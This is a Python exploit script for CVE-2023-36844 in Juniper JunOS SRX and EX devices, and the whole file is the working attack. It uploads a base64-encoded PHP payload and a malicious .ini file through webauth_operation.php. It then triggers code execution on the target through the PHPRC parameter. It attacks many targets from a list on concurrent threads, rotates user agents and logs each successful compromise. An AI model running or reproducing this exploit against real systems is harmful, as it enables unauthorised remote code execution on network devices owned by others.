# Author: Pari Malam

import requests
import re
import os
import base64
import argparse
import random
import concurrent.futures
from colorama import Fore
from sys import stdout

FG = Fore.GREEN
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
FC = Fore.CYAN

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"     ██╗██╗   ██╗███╗   ██╗██╗██████╗ ███████╗██████╗       ██████╗  ██████╗███████╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"     ██║██║   ██║████╗  ██║██║██╔══██╗██╔════╝██╔══██╗      ██╔══██╗██╔════╝██╔════╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"     ██║██║   ██║██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝█████╗██████╔╝██║     █████╗  \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██   ██║██║   ██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗╚════╝██╔══██╗██║     ██╔══╝  ╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚█████╔╝╚██████╔╝██║ ╚████║██║██║     ███████╗██║  ██║      ██║  ██║╚██████╗███████\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝      ╚═╝  ╚═╝ ╚═════╝╚══════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n")
    print(f"{Fore.YELLOW}[CVE-2023-36844] - {Fore.GREEN}Remote Code Execution in Juniper JunOS within SRX and EX Series products.")
banners()


PHP_UPLOAD_URL = "/webauth_operation.php"
INI_UPLOAD_URL = "/webauth_operation.php?PHPRC=/var/tmp/"

def users_agents():
    with open("lib/ua.txt", "r") as ua_file:
        user_agents = ua_file.readlines()
    user_agents = [ua.strip() for ua in user_agents if ua.strip()]
    return random.choice(user_agents)

def send_php_payload(url, payload):
    PHP_Payload = f"<?php echo('watchTowr:::{payload}:::rwoThctaw');?>"
    PHP_Payload_bytes = PHP_Payload.encode('ascii')
    PHP_Payload_base64 = base64.b64encode(PHP_Payload_bytes).decode('ascii')

    headers = {"User-Agent": users_agents(), "Content-Type": "application/x-www-form-urlencoded"}
    data = {"rs": "do_upload", "rsargs[0]": f"[{{\"fileData\":\"data:text/html;base64,{PHP_Payload_base64}\",\"fileName\":\"watchTowr.php\",\"csize\":{len(PHP_Payload)}}}]"}
    response = requests.post(url, headers=headers, data=data, verify=False)

    php_file = re.findall("0: '(.*?)'\},", response.text)
    php_path = str(php_file[0])

    return php_path

def send_ini_payload(url, payload):
    ini_payload = f'auto_prepend_file="/var/tmp/{payload}"'
    ini_payload_bytes = ini_payload.encode('ascii')
    ini_payload_b64 = base64.b64encode(ini_payload_bytes).decode('ascii')
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"rs": "do_upload", "rsargs[0]": f"[{{\"fileData\":\"data:plain/text;base64,{ini_payload_b64}\",\"fileName\":\"watchTowr.ini\",\"csize\":{len(ini_payload)}}}]"}
    response = requests.post(url, headers=headers, data=data, verify=False)
    ini_file = re.findall("0: '(.*?)'\},", response.text)
    ini_file = ini_file[0]
    return ini_file

def execute_payload(url, ini_file):
    exec_req = f"{url}{INI_UPLOAD_URL}{ini_file}"
    exec_response = requests.get(exec_req, verify=False)
    exec_success = re.findall("watchTowr:::(.*?):::rwoThctaw", exec_response.text)
    return exec_success[0]

def process_target(target, payload):
    try:
        print(f"{FY}[CVE-2023-36844] - {FW} - {target}")
        php_path = send_php_payload(f"{target}{PHP_UPLOAD_URL}", payload)
        print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Successfully uploaded the .php file, found at path: /var/tmp/{php_path}")
        ini_file = send_ini_payload(f"{target}{PHP_UPLOAD_URL}", php_path)
        with open("Results/Results.txt", "a") as file:
            file.write(f"{target}{PHP_UPLOAD_URL} - /var/tmp/{php_path}")
        print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Successfully uploaded the .ini file, found at path: /var/tmp/{ini_file}")
        exec_success = execute_payload(target, ini_file)
        with open("Results/Results.txt", "a") as file:
            file.write(f"{target}{PHP_UPLOAD_URL} - /var/tmp/{ini_file}")
        print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Execution Results for: {exec_success}")
        with open("Results/Results.txt", "a") as file:
            file.write(f"{target} - {exec_success}")
    except Exception as e:
        print(f"{FY}[CVE-2023-36844] - {FW} - {target} {FR} - Error processing: {str(e)}")

def main():

    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-f", "--filename", help="File containing URLs/IPs", default=False, action="store", required=True)
    parser.add_argument("-t", "--threads", help="Number of concurrent threads for execution", type=int, default=1)
    parser.add_argument("--payload", help="PHP function to call, e.g., get_current_user()", required=False, action="store")

    try:
        args = parser.parse_args()
    except Exception as e:
        raise e
    
    with open(args.filename, 'r') as file:
        targets = file.read().splitlines()

    payload = args.payload or "php_uname()"

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(process_target, target, payload) for target in targets]

if __name__ == "__main__":
    main()
